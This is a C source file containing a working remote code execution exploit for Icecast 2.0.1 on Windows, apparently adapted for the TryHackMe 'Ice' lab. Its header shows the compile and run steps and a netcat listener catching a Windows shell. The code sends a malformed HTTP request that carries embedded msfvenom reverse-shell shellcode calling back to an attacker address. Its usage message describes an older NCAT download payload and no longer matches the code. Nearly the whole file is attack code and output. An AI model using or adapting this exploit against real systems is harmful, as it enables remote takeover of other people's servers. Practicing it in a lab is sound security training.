/* 

Original exploit here: https://www.exploit-db.com/exploits/568
I couldn't get this to work so I edited it according to
https://www.exploit-db.com/exploits/573

and made sure the shellcode was executed.

Compile and run
root@Kali:~/TryHackme/Ice# gcc 568-edit.c -o 568
root@Kali:~/TryHackme/Ice# ./568 192.168.92.133

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 192.168.92.133:8000
- send malformed data

Server IS vulnerable!!!

On listener
root@Kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>

*/ 

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
    #include <netinet/in.h> 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ 2048 
#define TIMEOUT 3 
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc" 

// msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -b '\x0a\x0d\x00' -f c
unsigned char shellcode[] =
"\xda\xc6\xd9\x74\x24\xf4\x5f\xb8\x1e\xf9\xbc\x15\x2b\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x13\x03\x59\xea\x5e\xe0\x99\xe4\x1d"
"\x0b\x61\xf5\x41\x85\x84\xc4\x41\xf1\xcd\x77\x72\x71\x83\x7b"
"\xf9\xd7\x37\x0f\x8f\xff\x38\xb8\x3a\x26\x77\x39\x16\x1a\x16"
"\xb9\x65\x4f\xf8\x80\xa5\x82\xf9\xc5\xd8\x6f\xab\x9e\x97\xc2"
"\x5b\xaa\xe2\xde\xd0\xe0\xe3\x66\x05\xb0\x02\x46\x98\xca\x5c"
"\x48\x1b\x1e\xd5\xc1\x03\x43\xd0\x98\xb8\xb7\xae\x1a\x68\x86"
"\x4f\xb0\x55\x26\xa2\xc8\x92\x81\x5d\xbf\xea\xf1\xe0\xb8\x29"
"\x8b\x3e\x4c\xa9\x2b\xb4\xf6\x15\xcd\x19\x60\xde\xc1\xd6\xe6"
"\xb8\xc5\xe9\x2b\xb3\xf2\x62\xca\x13\x73\x30\xe9\xb7\xdf\xe2"
"\x90\xee\x85\x45\xac\xf0\x65\x39\x08\x7b\x8b\x2e\x21\x26\xc4"
"\x83\x08\xd8\x14\x8c\x1b\xab\x26\x13\xb0\x23\x0b\xdc\x1e\xb4"
"\x6c\xf7\xe7\x2a\x93\xf8\x17\x63\x50\xac\x47\x1b\x71\xcd\x03"
"\xdb\x7e\x18\x83\x8b\xd0\xf3\x64\x7b\x91\xa3\x0c\x91\x1e\x9b"
"\x2d\x9a\xf4\xb4\xc4\x61\x9f\x7a\xb0\x35\xdf\x13\xc3\xc5\xde"
"\x58\x4a\x23\x8a\x8e\x1b\xfc\x23\x36\x06\x76\xd5\xb7\x9c\xf3"
"\xd5\x3c\x13\x04\x9b\xb4\x5e\x16\x4c\x35\x15\x44\xdb\x4a\x83"
"\xe0\x87\xd9\x48\xf0\xce\xc1\xc6\xa7\x87\x34\x1f\x2d\x3a\x6e"
"\x89\x53\xc7\xf6\xf2\xd7\x1c\xcb\xfd\xd6\xd1\x77\xda\xc8\x2f"
"\x77\x66\xbc\xff\x2e\x30\x6a\x46\x99\xf2\xc4\x10\x76\x5d\x80"
"\xe5\xb4\x5e\xd6\xe9\x90\x28\x36\x5b\x4d\x6d\x49\x54\x19\x79"
"\x32\x88\xb9\x86\xe9\x08\xc9\xcc\xb3\x39\x42\x89\x26\x78\x0f"
"\x2a\x9d\xbf\x36\xa9\x17\x40\xcd\xb1\x52\x45\x89\x75\x8f\x37"
"\x82\x13\xaf\xe4\xa3\x31";


/* 
in my example 0xcc is used to interrupt the code execution, you must 
put your shellcode exactly there. 
You don't need to call a shellcode offset (CALL ESP, JMP ESP and so 
on) or doing any other annoying operation because the code flow 
points directly there!!! 
Cool and easy 8-) 
*/ 


/*int startWinsock(void) 
{ 
  WSADATA wsa; 
  return WSAStartup(MAKEWORD(2,0),&wsa); 
} 
*/
int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 

int main(int argc, char *argv[]) { 
    struct sockaddr_in peer; 
    int sd; 
    u_short port = PORT; 
    u_char buff[BUFFSZ]; 
    u_char buf[4096]; 
    u_char *pointer=NULL; 

    setbuf(stdout, NULL); 

    fputs("\n" 
        "Icecast <= 2.0.1 Win32 remote code execution "VER"\n" 
        "by Luigi Auriemma\n" 
        "e-mail: aluigi@altervista.org\n" 
        "web:http://aluigi.altervista.org\n" 
  "\nshellcode add-on by Delikon\n" 
  "www.delikon.de" 
        "\n", stdout); 

    if(argc < 2) { 
        printf("\nUsage: %s <server> [port(%d)]\n" 
            "\n" 
            "Note: This exploit will force the Icecast server to download NCAT\n" 
            "and after execution it will spwan a shell on 9999\n" 
            "\n", argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]); 

    peer.sin_addr.s_addr = resolv(argv[1]); 
    peer.sin_port= htons(port); 
    peer.sin_family= AF_INET; 

    memset(buf,0x00,sizeof(buf)); 
    strcpy(buf,EXEC); 
    
pointer =strrchr(buf,0xcc); 

strcpy(pointer,shellcode); 

strcat(buf,"\r\n"); 
strcat(buf,"\r\n"); 
    

    printf("\n- target %s:%hu\n", 
        inet_ntoa(peer.sin_addr), port); 

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if(sd < 0) std_err(); 

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) 
      < 0) std_err(); 

    fputs("- send malformed data\n", stdout); 
    if(send(sd, buf, strlen(buf), 0) 
      < 0) std_err(); 

    if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) < 0)) { 
        fputs("\nServer IS vulnerable!!!\n\n", stdout); 
    } else { 
        fputs("\nServer doesn't seem vulnerable\n\n", stdout); 
    } 

    close(sd); 
    return(0); 
} 

int timeout(int sock) { 
    struct timeval tout; 
    fd_set fd_read; 
    int err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&fd_read); 
    FD_SET(sock, &fd_read); 
    err = select(sock + 1, &fd_read, NULL, NULL, &tout); 
    if(err < 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 

u_long resolv(char *host) { 
    struct hostent *hp; 
    u_long host_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf("\nError: Unable to resolve hostname (%s)\n", host); 
            exit(1); 
        } else host_ip = *(u_long *)(hp->h_addr); 
    } 
    return(host_ip); 
} 

#ifndef WIN32 
    void std_err(void) { 
        exit(1); 
    } 
#endif 

// milw0rm.com [2004-10-06]
